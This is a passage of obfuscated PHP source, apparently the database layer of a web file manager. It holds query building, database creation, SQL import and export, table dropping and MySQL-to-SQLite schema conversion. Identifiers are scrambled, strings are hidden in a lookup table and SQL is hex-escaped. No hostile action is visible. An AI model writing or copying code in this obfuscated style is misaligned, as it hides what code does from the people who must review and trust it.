$this->parseBind(!empty($¸´ÊŸÒ[$¦õ›‰š¡[285]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[285]] : array())); } public function delete($şıÄóîô = array()) { $ëÎ˜ÊÏ¿ =& $_SERVER[§ŒØóıü]; $this->model = $şıÄóîô[$ëÎ˜ÊÏ¿[281]]; $²®ˆ“Š„ = $ëÎ˜ÊÏ¿[1048] . $this->parseTable($şıÄóîô[$ëÎ˜ÊÏ¿[279]]) . $this->parseWhere(!empty($şıÄóîô[$ëÎ˜ÊÏ¿[275]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[275]] : $ëÎ˜ÊÏ¿[12]) . $this->parseOrder(!empty($şıÄóîô[$ëÎ˜ÊÏ¿[365]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[365]] : $ëÎ˜ÊÏ¿[12]) . $this->parseLimit(!empty($şıÄóîô[$ëÎ˜ÊÏ¿[292]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[292]] : $ëÎ˜ÊÏ¿[12]) . $this->parseLock(isset($şıÄóîô[$ëÎ˜ÊÏ¿[849]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[849]] : !1) . $this->parseComment(!empty($şıÄóîô[$ëÎ˜ÊÏ¿[354]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[354]] : $ëÎ˜ÊÏ¿[12]); return $this->execute($²®ˆ“Š„, $this->parseBind(!empty($şıÄóîô[$ëÎ˜ÊÏ¿[285]]) ? $şıÄóîô[$ëÎ˜ÊÏ¿[285]] : array())); } public function select($‘âÄ“›› = array()) { $Şôì‹‹å =& $_SERVER[§ŒØóıü]; $this->model = $‘âÄ“››[$Şôì‹‹å[281]]; $­³¦»ÓÖ = $this->buildSelectSql($‘âÄ“››); $Ôä‰©¿ƒ = isset($‘âÄ“››[$Şôì‹‹å[349]]) ? $‘âÄ“››[$Şôì‹‹å[349]] : !1; if ($Ôä‰©¿ƒ) { $”Ç”Èş = is_string($Ôä‰©¿ƒ[$Şôì‹‹å[94]]) ? $Ôä‰©¿ƒ[$Şôì‹‹å[94]] : $Şôì‹‹å[1049] . md5($­³¦»ÓÖ); $œüû³ş“ = think_cache($”Ç”Èş, $Şôì‹‹å[12], $Ôä‰©¿ƒ); if (!1 !== $œüû³ş“) { return $œüû³ş“; } } $Ä—ÓŒÃ¾ = $this->query($­³¦»ÓÖ, $this->parseBind(!empty($‘âÄ“››[$Şôì‹‹å[285]]) ? $‘âÄ“››[$Şôì‹‹å[285]] : array())); if ($Ôä‰©¿ƒ && !1 !== $Ä—ÓŒÃ¾) { think_cache($”Ç”Èş, $Ä—ÓŒÃ¾, $Ôä‰©¿ƒ); } return $Ä—ÓŒÃ¾; } public function buildSelectSql($¢˜œô…ø = array()) { $…»’× =& $_SERVER[§ŒØóıü]; if (isset($¢˜œô…ø[$…»’×[353]])) { if (strpos($¢˜œô…ø[$…»’×[353]], $…»’×[50])) { list($ÍçáÁôœ, $í´Ú¤ŸÄ) = explode($…»’×[50], $¢˜œô…ø[$…»’×[353]]); } else { $ÍçáÁôœ = $¢˜œô…ø[$…»’×[353]]; } $ÍçáÁôœ = $ÍçáÁôœ ? $ÍçáÁôœ : 1; $í´Ú¤ŸÄ = isset($í´Ú¤ŸÄ) ? $í´Ú¤ŸÄ : (is_numeric($¢˜œô…ø[$…»’×[292]]) ? $¢˜œô…ø[$…»’×[292]] : 20); $·‚¦ãõ = $í´Ú¤ŸÄ * ((int) $ÍçáÁôœ - 1); $¢˜œô…ø[$…»’×[292]] = $·‚¦ãõ . $…»’×[50] . $í´Ú¤ŸÄ; } if (think_config($…»’×[1050])) { $û©ŒÔã = $…»’×[1051] . md5(serialize($¢˜œô…ø)); $ßÒèíÑ± = think_cache($û©ŒÔã); if ($ßÒèíÑ±) { return $ßÒèíÑ±; } } $ƒÌœˆÖ” = $this->parseSql($this->selectSql, $¢˜œô…ø); $ƒÌœˆÖ” .= $this->parseLock(isset($¢˜œô…ø[$…»’×[849]]) ? $¢˜œô…ø[$…»’×[849]] : !1); if (isset($û©ŒÔã)) { think_cache($û©ŒÔã, $ƒÌœˆÖ”); } return $ƒÌœˆÖ”; } public function parseSql($‚¹Ë¢ïŞ, $Ğö€‡†… = array()) { $ëÍ—Óóš =& $_SERVER[§ŒØóıü]; $‚¹Ë¢ïŞ = str_replace(array($ëÍ—Óóš[1052], $ëÍ—Óóš[1053], $ëÍ—Óóš[1054], $ëÍ—Óóš[1055], $ëÍ—Óóš[1056], $ëÍ—Óóš[1057], $ëÍ—Óóš[1058], $ëÍ—Óóš[1059], $ëÍ—Óóš[1060], $ëÍ—Óóš[1061], $ëÍ—Óóš[1062]), array($this->parseTable("{$Ğö€‡†…[$ëÍ—Óóš[279]]}"), $this->parseDistinct(isset($Ğö€‡†…[$ëÍ—Óóš[1063]]) ? $Ğö€‡†…[$ëÍ—Óóš[1063]] : !1), $this->parseField(!empty($Ğö€‡†…[$ëÍ—Óóš[273]]) ? $Ğö€‡†…[$ëÍ—Óóš[273]] : $ëÍ—Óóš[189]), $this->parseJoin(!empty($Ğö€‡†…[$ëÍ—Óóš[282]]) ? $Ğö€‡†…[$ëÍ—Óóš[282]] : $ëÍ—Óóš[12]), $this->parseWhere(!empty($Ğö€‡†…[$ëÍ—Óóš[275]]) ? $Ğö€‡†…[$ëÍ—Óóš[275]] : $ëÍ—Óóš[12]), $this->parseGroup(!empty($Ğö€‡†…[$ëÍ—Óóš[505]]) ? $Ğö€‡†…[$ëÍ—Óóš[505]] : $ëÍ—Óóš[12]), $this->parseHaving(!empty($Ğö€‡†…[$ëÍ—Óóš[1064]]) ? $Ğö€‡†…[$ëÍ—Óóš[1064]] : $ëÍ—Óóš[12]), $this->parseOrder(!empty($Ğö€‡†…[$ëÍ—Óóš[365]]) ? $Ğö€‡†…[$ëÍ—Óóš[365]] : $ëÍ—Óóš[12]), $this->parseLimit(!empty($Ğö€‡†…[$ëÍ—Óóš[292]]) ? $Ğö€‡†…[$ëÍ—Óóš[292]] : $ëÍ—Óóš[12]), $this->parseUnion(!empty($Ğö€‡†…[$ëÍ—Óóš[347]]) ? $Ğö€‡†…[$ëÍ—Óóš[347]] : $ëÍ—Óóš[12]), $this->parseComment(!empty($Ğö€‡†…[$ëÍ—Óóš[354]]) ? $Ğö€‡†…[$ëÍ—Óóš[354]] : $ëÍ—Óóš[12])), $‚¹Ë¢ïŞ); return $‚¹Ë¢ïŞ; } public function getLastSql($»’ÚõŠ = '') { return $»’ÚõŠ ? $this->modelSql[$»’ÚõŠ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($êê“ö ®) { return addslashes($êê“ö ®); } public function setModel($î›Ë‘—£) { $this->model = $î›Ë‘—£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ñ²«†ä = array()) { $ƒÃÃì¤ =& $_SERVER[§ŒØóıü]; if (empty($Ñ²«†ä)) { $Ñ²«†ä = $GLOBALS[$ƒÃÃì¤[6]][$ƒÃÃì¤[21]]; } $this->database = $Ñ²«†ä; } public function model($ÚôÁ©éØ = '') { return new ModelBase($ÚôÁ©éØ, $_SERVER[§ŒØóıü][12], $this->database); } public function db($•çÕÅ“± = false) { $òö««Ü =& $_SERVER[§ŒØóıü]; $ÒãˆÍß¤ = array_change_key_case($this->database); if ($this->dbType() == $òö««Ü[13] || !$•çÕÅ“±) { return $this->model()->db(); } $‘‘»¼Ö = $ÒãˆÍß¤[$òö««Ü[978]]; $ÒãˆÍß¤[$òö««Ü[978]] = $òö««Ü[12]; if ($ÒãˆÍß¤[$òö««Ü[973]] == $òö««Ü[970]) { $ŸÆ¥…­ˆ = $ÒãˆÍß¤[$òö««Ü[979]]; $ÒãˆÍß¤[$òö««Ü[979]] = substr($ŸÆ¥…­ˆ, 0, strrpos($ŸÆ¥…­ˆ, $òö««Ü[1065])); } $this->database = $ÒãˆÍß¤; $ı”ıâÓº = $this->model()->db(); try { $àÔ ¥Ø = $ı”ıâÓº->execute("\x73\150\x6f\167\40\144\x61\x74\141\142\141\163\145\163\x20\x6c\151\x6b\x65\40\47{$‘‘»¼Ö}\x27"); } catch (Exception $¾¿—æ«Ñ) { } if (!$àÔ ¥Ø) { $ı”ıâÓº->execute("\143\x72\145\141\x74\145\40\x64\x61\x74\x61\142\x61\x73\145\x20\140{$‘‘»¼Ö}\140"); } $ÒãˆÍß¤[$òö««Ü[978]] = $‘‘»¼Ö; if ($ÒãˆÍß¤[$òö««Ü[973]] == $òö««Ü[970]) { $ÒãˆÍß¤[$òö««Ü[979]] .= $òö««Ü[1065] . $‘‘»¼Ö; } $this->database = $ÒãˆÍß¤; $ı”ıâÓº->execute("\165\x73\x65\40\140{$‘‘»¼Ö}\x60"); return $ı”ıâÓº; } public function createTable($ş’ß¤œ¢, &$±†ßãÆ) { $‘ òˆ =& $_SERVER[§ŒØóıü]; if (!IO::exist($ş’ß¤œ¢)) { ActionCall($‘ òˆ[1066], !0, 0); show_json(LNG($‘ òˆ[1067]), !1); } $Òµìúé = $this->model()->db(); $ÙÊ¡»Ÿ = sqlSplit(IO::getContent($ş’ß¤œ¢)); foreach ($ÙÊ¡»Ÿ as $³ÉöĞ¶¹) { $Óş»­½ˆ = stripos($³ÉöĞ¶¹, $‘ òˆ[1068]) === 0; if ($Óş»­½ˆ) { $±†ßãÆ->task[$‘ òˆ[792]] += 1; } $Òµìúé->execute($³ÉöĞ¶¹); if ($Óş»­½ˆ) { preg_match($‘ òˆ[1069], $³ÉöĞ¶¹, $úç§‘Í‚); $±†ßãÆ->task[$‘ òˆ[1070]] = $úç§‘Í‚[1]; $±†ßãÆ->update(1); } } } public function insertTable($‡öü”Â†, &$ùü«õµ) { $›Íµ×­ =& $_SERVER[§ŒØóıü]; $§¯˜Û¸— = $this->model()->db(); $ Î¦­ = $Èº÷ñ…¼ ? array($Èº÷ñ…¼) : $§¯˜Û¸—->getTables(); foreach ($‡öü”Â† as $Ä×‰åÃÌ) { $Èº÷ñ…¼ = basename($Ä×‰åÃÌ, $›Íµ×­[794]); if (!in_array($Èº÷ñ…¼, $ Î¦­)) { continue; } $ùü«õµ->task[$›Íµ×­[1070]] = $Èº÷ñ…¼; if (get_filesize($Ä×‰åÃÌ) == 0) { continue; } $ÃõäÑø‚ = $this->sqlToDb($Ä×‰åÃÌ, $ùü«õµ); if (!$ÃõäÑø‚) { ActionCall($›Íµ×­[1066], !0, 0); show_json(LNG($›Íµ×­[1071]) . "\x5b{$Èº÷ñ…¼}\x5d", !1); } } } public function sqlFromDb($ÍÁªòÕ¯, $ŒÛÂäåï, &$’—µ¬½, $ı¬°†Ù = '') { if ($’—µ¬½) { $’—µ¬½->task[$_SERVER[§ŒØóıü][1070]] = $ÍÁªòÕ¯; } $ïøü°Äì = $this->model($ÍÁªòÕ¯); $À‹¿Ëä = 0; $ØóŒè›Ä = 0; $Ö¾ûıæ« = 10000; $ÍŸ·€ø» = fopen($ŒÛÂäåï, $_SERVER[§ŒØóıü][1072]); $¡‹â¤ = $ïøü°Äì->getPk(); $°ÑŒ¦Æê = $ïøü°Äì->getDbFields(); $’öŠ’Í = $_SERVER[§ŒØóıü][12]; if ($GLOBALS[$_SERVER[§ŒØóıü][793]] && in_array($ÍÁªòÕ¯, array($_SERVER[§ŒØóıü][1073], $_SERVER[§ŒØóıü][1074]))) { $’öŠ’Í = $ÍÁªòÕ¯; } do { $é˜ÈÄ´ = array($¡‹â¤ => array($_SERVER[§ŒØóıü][1020], $ØóŒè›Ä)); $¡ŸšôØÏ = $ïøü°Äì->where($é˜ÈÄ´)->field($°ÑŒ¦Æê)->order($¡‹â¤ . $_SERVER[§ŒØóıü][1075])->limit($Ö¾ûıæ«)->select(); $¡ŸšôØÏ = !empty($¡ŸšôØÏ) ? $¡ŸšôØÏ : array(); if (!($ õ‚±ï× = count($¡ŸšôØÏ))) { break; } $Ôì©÷üé = end($¡ŸšôØÏ); $ØóŒè›Ä = $Ôì©÷üé[$¡‹â¤]; $§„…µÚ˜ = array(); foreach ($¡ŸšôØÏ as $±ĞæƒØ‘) { if ($’öŠ’Í) { if ($ÍÁªòÕ¯ == $_SERVER[§ŒØóıü][1073]) { if ($±ĞæƒØ‘[$_SERVER[§ŒØóıü][33]] == $_SERVER[§ŒØóıü][1076]) { $ã ±³ŒÂ = json_decode($±ĞæƒØ‘[$_SERVER[§ŒØóıü][374]], !0); if ($ã ±³ŒÂ[$_SERVER[§ŒØóıü][32]] == $GLOBALS[$_SERVER[§ŒØóıü][793]] && $ã ±³ŒÂ[$_SERVER[§ŒØóıü][755]] != 1) { continue; } } } else { if ($±ĞæƒØ‘[$_SERVER[§ŒØóıü][33]] == $_SERVER[§ŒØóıü][1077] && $±ĞæƒØ‘[$_SERVER[§ŒØóıü][94]] == $_SERVER[§ŒØóıü][785]) { continue; } } } if ($ı¬°†Ù) { $±ĞæƒØ‘[$_SERVER[§ŒØóıü][84]] = "\173\151\x6f\x3a{$ı¬°†Ù}\x7d" . substr($±ĞæƒØ‘[$_SERVER[§ŒØóıü][84]], strlen("\x7b\151\157\x3a{$±ĞæƒØ‘[$_SERVER[§ŒØóıü][823]]}\x7d")); $±ĞæƒØ‘[$_SERVER[§ŒØóıü][823]] = $ı¬°†Ù; } $§„…µÚ˜[] = $_SERVER[§ŒØóıü][1078] . $this->sqlEncode($±ĞæƒØ‘) . $_SERVER[§ŒØóıü][1079]; } $ÎŠŸ’« = "\x49\x4e\x53\105\x52\x54\40\111\x4e\x54\117\x20\x60{$ÍÁªòÕ¯}\x60\x20\x28\140" . implode($_SERVER[§ŒØóıü][1080], $°ÑŒ¦Æê) . $_SERVER[§ŒØóıü][1081]; fwrite($ÍŸ·€ø», $ÎŠŸ’« . implode($_SERVER[§ŒØóıü][1082], $§„…µÚ˜) . $_SERVER[§ŒØóıü][71] . PHP_EOL); $À‹¿Ëä += $ õ‚±ï×; if ($’—µ¬½) { $’—µ¬½->update($ õ‚±ï×); } } while ($Ö¾ûıæ« == $ õ‚±ï×); fclose($ÍŸ·€ø»); return $À‹¿Ëä; } public function sqlToDb($Ş£›¿¡ø, &$àÜÄ‚©ı) { $Ğ½ø¹¤ò =& $_SERVER[§ŒØóıü]; $™œ¶Ğ¬ = $this->model()->db(); $‘Û—¹Ë» = @fopen($Ş£›¿¡ø, $Ğ½ø¹¤ò[1083]); if (!$‘Û—¹Ë») { return !1; } $“…Áà•® = 0; $Ş¿íÁ´ = $Ğ½ø¹¤ò[12]; $ÒòÈÛ³ = array(); $öŒ¤·æÜ = $this->dbType(); $ÑâÓ³Æ­ = $öŒ¤·æÜ == $Ğ½ø¹¤ò[13] ? 500 : 2000; $ÔÄ„±£ = basename($Ş£›¿¡ø, $Ğ½ø¹¤ò[794]); $í‘ÓÓ•á = 0; $æ”Å¹—Ğ = 4194304 - 104858; $‡…ÀîÈ = 1000000 - 104858; while (!feof($‘Û—¹Ë»)) { $¹Å¤³±„ = trim(fgets($‘Û—¹Ë»)); if (!$¹Å¤³±„) { continue; } $Û¡¸²¤İ = $this->sqlDecode($¹Å¤³±„, $öŒ¤·æÜ, $ÔÄ„±£); if (stripos($Û¡¸²¤İ, $Ğ½ø¹¤ò[355]) === 0) { if (!$Ş¿íÁ´) { $Ş¿íÁ´ = $Û¡¸²¤İ . $Ğ½ø¹¤ò[53]; } continue; } if ($àÜÄ‚©ı) { $àÜÄ‚©ı->task[$Ğ½ø¹¤ò[792]] += 1; } $“…Áà•®++; $ÒòÈÛ³[] = rtrim(rtrim(trim($Û¡¸²¤İ), $Ğ½ø¹¤ò[50]), $Ğ½ø¹¤ò[71]); $Î§â¤º = null; $¡Ÿıö° = strlen($Û¡¸²¤İ); $í‘ÓÓ•á += $¡Ÿıö°; if ($í‘ÓÓ•á >= ($ÑâÓ³Æ­ == 500 ? $‡…ÀîÈ : $æ”Å¹—Ğ)) { $Î§â¤º = array_pop($ÒòÈÛ³); if ($“…Áà•® > 1) { $“…Áà•®--; } } if ($“…Áà•® >= $ÑâÓ³Æ­ || $Î§â¤º) { $Û¡¸²¤İ = $Ş¿íÁ´ . implode($Ğ½ø¹¤ò[50], $ÒòÈÛ³); if (!$™œ¶Ğ¬->execute($Û¡¸²¤İ)) { return !1; } if ($àÜÄ‚©ı) { $àÜÄ‚©ı->update($“…Áà•®); } $ÒòÈÛ³ = array(); $“…Áà•® = 0; $í‘ÓÓ•á = 0; if ($Î§â¤º) { $ÒòÈÛ³ = array($Î§â¤º); $“…Áà•® = 1; $í‘ÓÓ•á = $¡Ÿıö°; } } } fclose($‘Û—¹Ë»); if (!empty($ÒòÈÛ³)) { $Û¡¸²¤İ = $Ş¿íÁ´ . implode($Ğ½ø¹¤ò[50], $ÒòÈÛ³); if (!$™œ¶Ğ¬->execute($Û¡¸²¤İ)) { return !1; } if ($àÜÄ‚©ı) { $àÜÄ‚©ı->update($“…Áà•®); } } return !0; } public function dropTable($¨•¤¤ßÚ = null) { $°”¡¥Æ = $this->model()->db(); $ÅÜ®ø„° = $¨•¤¤ßÚ ? array($¨•¤¤ßÚ) : $°”¡¥Æ->getTables(); if (!$ÅÜ®ø„°) { return; } foreach ($ÅÜ®ø„° as $¨•¤¤ßÚ) { if ($¨•¤¤ßÚ) { $¨•¤¤ßÚ = strtolower($¨•¤¤ßÚ); } else { continue; } $°”¡¥Æ->execute("\144\162\x6f\160\x20\164\x61\x62\x6c\x65\x20\x69\x66\40\x65\x78\151\163\x74\x73\x20\x60{$¨•¤¤ßÚ}\140"); } } private function sqlEncode($úŒï½›) { $Ç ÆÈÏô =& $_SERVER[§ŒØóıü]; $úäÔ´Õ² = array(); foreach ($úŒï½› as $ö˜Í’ÓÏ) { if (is_array($ö˜Í’ÓÏ)) { $ö˜Í’ÓÏ = json_encode_force($ö˜Í’ÓÏ); } $ö˜Í’ÓÏ = addslashes($ö˜Í’ÓÏ); $ö˜Í’ÓÏ = str_replace(array($Ç ÆÈÏô[1084], $Ç ÆÈÏô[231]), array($Ç ÆÈÏô[1085], $Ç ÆÈÏô[1086]), $ö˜Í’ÓÏ); $úäÔ´Õ²[] = str_replace($Ç ÆÈÏô[58], $Ç ÆÈÏô[1087], $ö˜Í’ÓÏ); } return $Ç ÆÈÏô[58] . implode($Ç ÆÈÏô[1088], $úäÔ´Õ²) . $Ç ÆÈÏô[58]; } private function sqlDecode($ıµ’ÒâŸ, $–¨²ÊÈá, $ıÉûàèç = '') { $Ûã»¹…— =& $_SERVER[§ŒØóıü]; $ıµ’ÒâŸ = str_replace(array($Ûã»¹…—[1085], $Ûã»¹…—[1086]), array($Ûã»¹…—[1084], $Ûã»¹…—[231]), $ıµ’ÒâŸ); if ($–¨²ÊÈá == $Ûã»¹…—[13]) { return $ıÉûàèç != $Ûã»¹…—[1089] ? stripslashes($ıµ’ÒâŸ) : $ıµ’ÒâŸ; } if ($ıÉûàèç == $Ûã»¹…—[1089]) { $ıµ’ÒâŸ = str_replace($Ûã»¹…—[1090], $Ûã»¹…—[118], stripslashes($ıµ’ÒâŸ)); } return $ıµ’ÒâŸ; } public function getSqlFile($‹Š¯‘·Á = '') { $¯İª¢ú» =& $_SERVER[§ŒØóıü]; $¢¼ÍÀ… = $this->dbType(!0); $â•·‹² = CONTROLLER_DIR . "\x69\156\x73\164\141\154\x6c\57\x64\141\164\141\57{$¢¼ÍÀ…}\56\163\161\x6c"; $ÍæÍ¸ìÆ = file_get_contents($â•·‹²); $¬£éåúÔ = $¯İª¢ú»[1091] . ($¢¼ÍÀ… == $¯İª¢ú»[810] ? $¯İª¢ú»[1092] : $¯İª¢ú»[1093]) . $¯İª¢ú»[1094]; preg_match_all($¬£éåúÔ, $ÍæÍ¸ìÆ, $ˆÁìğ’Ù); $•’Í Ù™ = $ˆÁìğ’Ù[1]; $ş“†ª— = $this->model()->db(); $ô÷ÎÙÇ¦ = $ş“†ª—->getTables(); $”Ã¹ñ¨Ú = TEMP_FILES . $¯İª¢ú»[1095] . date($¯İª¢ú»[756]) . $¯İª¢ú»[8]; del_dir($”Ã¹ñ¨Ú); mk_dir($”Ã¹ñ¨Ú); $Ò«Ş¸Âà = $”Ã¹ñ¨Ú . $¯İª¢ú»[1096]; $÷™ñÒ®¯ = $”Ã¹ñ¨Ú . $¯İª¢ú»[1097]; $ùÅ´äŞæ = $¢¼ÍÀ… == $¯İª¢ú»[13] ? $¯İª¢ú»[810] : $¯İª¢ú»[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\x6c\57\144\141\164\x61\57{$ùÅ´äŞæ}\x2e\163\x71\154", $”Ã¹ñ¨Ú); @touch($”Ã¹ñ¨Ú . $¢¼ÍÀ… . $¯İª¢ú»[794]); $”¼÷ÚÎâ = fopen($Ò«Ş¸Âà, $¯İª¢ú»[1072]); $¤èÆ®Ä = fopen($÷™ñÒ®¯, $¯İª¢ú»[1072]); if ($¢¼ÍÀ… == $¯İª¢ú»[13]) { $ô÷ÎÙÇ¦ = array_diff($ô÷ÎÙÇ¦, array($¯İª¢ú»[790], $¯İª¢ú»[791])); $‹èıäÙÉ = array($¯İª¢ú»[1098], $¯İª¢ú»[1099], $¯İª¢ú»[1100]); fwrite($¤èÆ®Ä, implode(PHP_EOL, $‹èıäÙÉ) . PHP_EOL . PHP_EOL); foreach ($ô÷ÎÙÇ¦ as $ôô¶’¥°) { $Ô“éˆŠ© = $this->sqlFromSqlite($ôô¶’¥°); if (!$Ô“éˆŠ©[$¯İª¢ú»[13]]) { continue; } fwrite($¤èÆ®Ä, $Ô“éˆŠ©[$¯İª¢ú»[13]] . PHP_EOL . PHP_EOL); if (!in_array($ôô¶’¥°, $•’Í Ù™)) { fwrite($”¼÷ÚÎâ, $Ô“éˆŠ©[$¯İª¢ú»[810]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ô÷ÎÙÇ¦ as $ôô¶’¥°) { $Ô“éˆŠ© = $this->sqlFromMysql($ôô¶’¥°); if (!$Ô“éˆŠ©[$¯İª¢ú»[810]]) { continue; } fwrite($”¼÷ÚÎâ, $Ô“éˆŠ©[$¯İª¢ú»[810]] . PHP_EOL . PHP_EOL); if (!in_array($ôô¶’¥°, $•’Í Ù™)) { fwrite($¤èÆ®Ä, $Ô“éˆŠ©[$¯İª¢ú»[13]] . PHP_EOL . PHP_EOL); } } } fclose($”¼÷ÚÎâ); fclose($¤èÆ®Ä); $ÍæÍ¸ìÆ = array($¯İª¢ú»[810] => $Ò«Ş¸Âà, $¯İª¢ú»[13] => $÷™ñÒ®¯); return $‹Š¯‘·Á ? $ÍæÍ¸ìÆ[$‹Š¯‘·Á] : $ÍæÍ¸ìÆ; } public function dbType($ºÉí¸Á© = false) { $ëÈå½ÔĞ =& $_SERVER[§ŒØóıü]; $øÈ‰¥¨ƒ = $ºÉí¸Á© ? $GLOBALS[$ëÈå½ÔĞ[6]][$ëÈå½ÔĞ[21]] : $this->database; $øÈ‰¥¨ƒ = array_change_key_case($øÈ‰¥¨ƒ); $à¸Ïò”é = $øÈ‰¥¨ƒ[$ëÈå½ÔĞ[973]]; if ($à¸Ïò”é == $ëÈå½ÔĞ[970]) { $³áƒèÜ‰ = explode($ëÈå½ÔĞ[4], $øÈ‰¥¨ƒ[$ëÈå½ÔĞ[979]]); $à¸Ïò”é = $³áƒèÜ‰[0]; } $›ÎµÇìÎ = array($ëÈå½ÔĞ[1101] => $ëÈå½ÔĞ[13], $ëÈå½ÔĞ[918] => $ëÈå½ÔĞ[810]); if (isset($›ÎµÇìÎ[$à¸Ïò”é])) { $à¸Ïò”é = $›ÎµÇìÎ[$à¸Ïò”é]; } return $à¸Ïò”é; } public function sqlFromMysql($îè”ˆùº, $ê–ÈÇô£ = '') { $ø˜«Ä =& $_SERVER[§ŒØóıü]; $‚”…ºó‘ = $this->model()->db(); $Éö“ì¶æ = $‚”…ºó‘->query($ø˜«Ä[1102] . $îè”ˆùº . $ø˜«Ä[385]); if (!$Éö“ì¶æ || !$Éö“ì¶æ[0]) { return !1; } $ïı¨Ô™Ÿ = _get($Éö“ì¶æ[0], $ø˜«Ä[1103], $ø˜«Ä[12]); if (!$ïı¨Ô™Ÿ) { return !1; } $”²ÏÅûá = "\x44\x52\117\x50\40\124\x41\x42\x4c\x45\x20\111\106\40\105\x58\x49\123\124\123\40\140{$îè”ˆùº}\140\x3b" . PHP_EOL . $ïı¨Ô™Ÿ . $ø˜«Ä[71]; if ($ê–ÈÇô£ && $ê–ÈÇô£ == $ø˜«Ä[810]) { return $”²ÏÅûá; } $µ÷Ú€ÜÃ = array_change_key_case($GLOBALS[$ø˜«Ä[6]][$ø˜«Ä[21]]); $›»˜êñò = $µ÷Ú€ÜÃ[$ø˜«Ä[978]]; $‚…ó‹é = $ø˜«Ä[1104] . $›»˜êñò . $ø˜«Ä[1105] . $îè”ˆùº . $ø˜«Ä[58]; $²€‘’¸¿ = $ø˜«Ä[1106] . $îè”ˆùº . $ø˜«Ä[906]; $İ‰´‡¼ = $‚”…ºó‘->query($‚…ó‹é); if (empty($İ‰´‡¼)) { $½„ˆ­ü£ = array($ø˜«Ä[810] => $ø˜«Ä[12], $ø˜«Ä[13] => $ø˜«Ä[12]); return $ê–ÈÇô£ ? $½„ˆ­ü£[$ê–ÈÇô£] : $½„ˆ­ü£; } $„µÔ‡©Ö = $‚”…ºó‘->query($²€‘’¸¿); $¥º¤ƒ„Ã = $ø˜«Ä[12]; $‚²ìº•— = array(); foreach ($„µÔ‡©Ö as $õıÚ€Âİ) { if (!$¥º¤ƒ„Ã && $õıÚ€Âİ[$ø˜«Ä[1107]] == $ø˜«Ä[1108]) { $¥º¤ƒ„Ã = $õıÚ€Âİ[$ø˜«Ä[1109]]; } if (isset($‚²ìº•—[$õıÚ€Âİ[$ø˜«Ä[1107]]])) { $‚²ìº•—[$õıÚ€Âİ[$ø˜«Ä[1107]]][$ø˜«Ä[1110]][] = $õıÚ€Âİ[$ø˜«Ä[1109]]; continue; } $‚²ìº•—[$õıÚ€Âİ[$ø˜«Ä[1107]]] = array($ø˜«Ä[1111] => $õıÚ€Âİ[$ø˜«Ä[1107]], $ø˜«Ä[1110] => array($õıÚ€Âİ[$ø˜«Ä[1109]]), $ø˜«Ä[1112] => $õıÚ€Âİ[$ø˜«Ä[1113]] == $ø˜«Ä[88] ? 0 : 1); } $œÛ“è®¾ = array(); foreach ($‚²ìº•— as $õıÚ€Âİ) { $Š¹Ô†Ä† = $õıÚ€Âİ[$ø˜«Ä[1111]] == $ø˜«Ä[1108]; $Æ¢ë…Ï‰ = array($ø˜«Ä[1114], $õıÚ€Âİ[$ø˜«Ä[1112]] == $ø˜«Ä[88] && !$Š¹Ô†Ä† ? $ø˜«Ä[1115] : $ø˜«Ä[12], $ø˜«Ä[1116], $ø˜«Ä[1117] . $îè”ˆùº . $ø˜«Ä[11] . ($Š¹Ô†Ä† ? $ø˜«Ä[1118] : $õıÚ€Âİ[$ø˜«Ä[1111]]) . $ø˜«Ä[118], $ø˜«Ä[1119], $ø˜«Ä[118] . $îè”ˆùº . $ø˜«Ä[118], $ø˜«Ä[1120] . implode($ø˜«Ä[1121], $õıÚ€Âİ[$ø˜«Ä[1110]]) . $ø˜«Ä[1122]); $œÛ“è®¾[] = implode($ø˜«Ä[53], $Æ¢ë…Ï‰) . $ø˜«Ä[71]; } $ÎŸˆ×Óè = array(); $Æ±æÄÄÓ = array($ø˜«Ä[1123] => $ø˜«Ä[1124], $ø˜«Ä[1124] => $ø˜«Ä[1124], $ø˜«Ä[288] => $ø˜«Ä[315], $ø˜«Ä[287] => $ø˜«Ä[315]); foreach ($İ‰´‡¼ as $õıÚ€Âİ) { $Æ¢ë…Ï‰ = array($ø˜«Ä[118] . $õıÚ€Âİ[$ø˜«Ä[1125]] . $ø˜«Ä[118], isset($Æ±æÄÄÓ[$õıÚ€Âİ[$ø˜«Ä[1126]]]) ? $Æ±æÄÄÓ[$õıÚ€Âİ[$ø˜«Ä[1126]]] : $õıÚ€Âİ[$ø˜«Ä[1127]], $õıÚ€Âİ[$ø˜«Ä[1128]] == $ø˜«Ä[904] ? $ø˜«Ä[1129] : $ø˜«Ä[1130], $õıÚ€Âİ[$ø˜«Ä[1125]] == $¥º¤ƒ„Ã ? $ø˜«Ä[1131] : $ø˜«Ä[12], $õıÚ€Âİ[$ø˜«Ä[955]] ? strtoupper(str_replace($ø˜«Ä[11], $ø˜«Ä[12], $õıÚ€Âİ[$ø˜«Ä[955]])) : $ø˜«Ä[12]); $ÎŸˆ×Óè[] = trim(implode($ø˜«Ä[53], $Æ¢ë…Ï‰)); } $¤îèáÁç = array($ø˜«Ä[1132] . $îè”ˆùº . $ø˜«Ä[1133], $ø˜«Ä[1134] . $îè”ˆùº . $ø˜«Ä[1135], implode($ø˜«Ä[50] . PHP_EOL, $ÎŸˆ×Óè), $ø˜«Ä[952]); $«„ôÊØ = implode(PHP_EOL, array_merge($¤îèáÁç, $œÛ“è®¾)); if ($ê–ÈÇô£ && $ê–ÈÇô£ == $ø˜«Ä[13]) { return $«„ôÊØ; } $½„ˆ­ü£ = array($ø˜«Ä[810] => $”²ÏÅûá, $ø˜«Ä[13] => $«„ôÊØ); return $ê–ÈÇô£ ? $½„ˆ­ü£[$ê–ÈÇô£] : $½„ˆ­ü£; } public function sqlFromSqlite($ÑéÔ¥¾, $±íÛÛ›æ = '') { $·è¦•“” =& $_SERVER[§ŒØóıü]; $šœ®¯İ¤ = $this->model()->db(); $Ã…Õ·¡ = "\x50\x52\x41\x47\115\x41\x20\x54\101\102\114\x45\137\111\116\106\117\40\x28\47{$ÑéÔ¥¾}\47\x29"; $©ñÛ«Á‘ = 